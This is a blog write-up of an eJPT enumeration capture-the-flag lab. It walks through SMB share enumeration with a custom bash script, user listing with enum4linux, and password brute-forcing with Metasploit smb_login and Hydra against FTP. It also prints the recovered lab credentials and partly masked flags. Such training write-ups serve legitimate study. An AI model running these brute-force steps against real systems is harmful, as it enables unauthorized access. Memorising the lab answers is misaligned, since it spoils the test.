---
title: "eJPT - Assessment Methodologies: Enumeration CTF 1"
date: 2025-05-20 00:00:00 - 0600
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]

---

The first step is to find the ip address of the target machine for that we are using this command to list the ip address form the hosts files `cat /etc/hosts`  then starting the `postgresql` for the msfconsole so that the service can run more effectively.



Before ever we starting here is the main lab environment and the question that we are have to found in that room 

### Lab Environment

A Linux machine is accessible at **target.ine.local**. Identify the services running on the machine and capture the flags. The flag is an md5 hash format.

- **Flag 1:** There is a samba share that allows anonymous access. Wonder what's in there!
- **Flag 2:** One of the samba users have a bad password. Their private share with the same name as their username is at risk!
- **Flag 3:** Follow the hint given in the previous flag to uncover this one.
- **Flag 4:** This is a warning meant to deter unauthorized users from logging in.

**Note:** The wordlists located in the following directory will be useful:

- /root/Desktop/wordlists

### Tools

- Nmap
- Metasploit
- Hydra
- enum4linux
- smbclient
- smbmap

### Questions

1. There is a samba share that allows anonymous access. Wonder what's in there!
    
2. One of the samba users have a bad password. Their private share with the same name as their username is at risk!
3. Follow the hint given in the previous flag to uncover this one.
4. This is a warning meant to deter unauthorized users from logging in.

---

### Question 1

---

Now with that lets start with the main to find the samba share which will give access to the anonymous access.

 
![alt text](/assets/img/image-1.png)


Since the modules `smb_enumshares` does not have the ability to run the custom wordlists we’ll use the bash script to run out the scan and here is the command for that

```bash
#!/bin/bash

# Obtain the target and wordlist from command-line arguments
target="$1"
wordlist="$2"

# Check if both arguments are provided
if [ -z "$target" ] || [ -z "$wordlist" ]; then
    echo "Usage: $0 <target> <wordlist>"
    exit 1
fi

# Check if the wordlist file exists
if [ ! -f "$wordlist" ]; then
    echo "Error: Wordlist file '$wordlist' not found."
    exit 1
fi

# Initialize an array to store successful shares
successful_shares=()

# Loop through each share in the wordlist
while read -r share; do
    echo -e "Testing share: \e[34m$share\e[0m"
    smbclient "//$target/$share" -N -c "ls" &>/dev/null

    if [ $? -eq 0 ]; then
        successful_shares+=("$share")
    fi
done < "$wordlist"

# Output the results
if [ ${#successful_shares[@]} -gt 0 ]; then
    echo -e "\n\e[32m[+] Successfully accessed shares:\e[0m"
    for share in "${successful_shares[@]}"; do
        echo -e "\e[32m[+] \e[34m$share\e[0m"
    done
else
    echo -e "\e[31m[-] No accessible shares found.\e[0m"
fi

echo -e "\n[+] SMB enumeration completed."
```

Then we’ll save the files in the local machines and change the script into the executable. 

![alt text](/assets/img/image-2.png)

then running the script with the arguments of target and the share’s list which is made available by scope. and here is the command for that 

```bash
./smb_enum.sh target.ine.local /root/Desktop/wordlists/shares.txt 
```

and we found some share what worth to take a look at it! `pubfiles`



By connection using the `smbclient` we are able to find the flag1.

```bash
smbclient \\\\target.ine.local\\pubfiles
get flag1.txt
!cat flag1.txt
```

---

### Question 2

One of the samba users have a bad password. Their private share with the same name as their username is at risk!

The scope says that samba user have the bad password first let’s check the available user using the tool called `enum4linux` .

```bash
enum4linux -a target.ine.local
```

![alt text](/assets/img/image-4.png)

Here we found 4 user’s and let’s a user list for the further use of it.

![alt text](/assets/img/image-5.png)

Then as the scope is related to the login we’ll use the `smb_login` models form the `msfconsole` which we’ll give the `user_pass` the password that is generated from the  `enum4linux` user list. then for the password we’ll use the scope password given by.

 

![alt text](/assets/img/image-6.png)

```bash
use auxiliary/scanner/smb/smb_login 
set user_file user.txt
set pass_file /root/Desktop/wordlists/unix_passwords.txt
set pass_file /root/Desktop/wordlists/unix_passwords.txt
run
```

after execution we found 2 user and their password for the smbshare’s and here is the list

![alt text](/assets/img/image-7.png)

```bash
josh:purple
alice:admin
```

Let’s try using the creds we found to login as them and find some information.



```bash
smbclient \\\\target.ine.local\\josh -U josh
ls
get flag2.txt
!cat flag2.txt
```

With that we found the `flag2.txt`  and here is the flag. 

FLAG2{06fb1ae898134918b11*********}

---

### Question 3

1. Follow the hint given in the previous flag to uncover this one.


<aside>
💡

Psst! I heard there is an FTP service running. Find it and check the banner.

</aside>

so now we have to focus on FTP services in his case we’ll use the hydra tool 

![alt text](/assets/img/image-9.png)

here is the command for it 

```bash
hydra -L user.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554
```

- **`hydra`** → The tool being used for brute-force attacks.
- **`L user.txt`** → Specifies a file (`user.txt`) containing a list of usernames to try.
- **`P /root/Desktop/wordlists/unix_passwords.txt`** → Specifies a file containing a list of passwords to try.
- **`ftp://target.ine.local`** → The target service (FTP) and hostname (`target.ine.local`).
- **`s 5554`** → Specifies a custom port (`5554`) instead of the default FTP port (`21`).

![alt text](/assets/img/image-10.png)
<aside>
💡

Found: alice:pretty

</aside>

Using the Creds we logged into the ftp services and got the flag3.



```bash
ftp target.ine.local 5554
ls
get flag3.txt
!cat flag3.txt
```

FLAG3{b4b818bbc0d84a60b380*********}

---

### Question 4

The services which we didn’t look into is the `ssh` so we’ll try to login into the services after which we found out that flag is present in that banner of the SSH services hence we also found the flag4.

 

FLAG4{1631ae1d05d2446ab47*********}

with that this room comes to an end!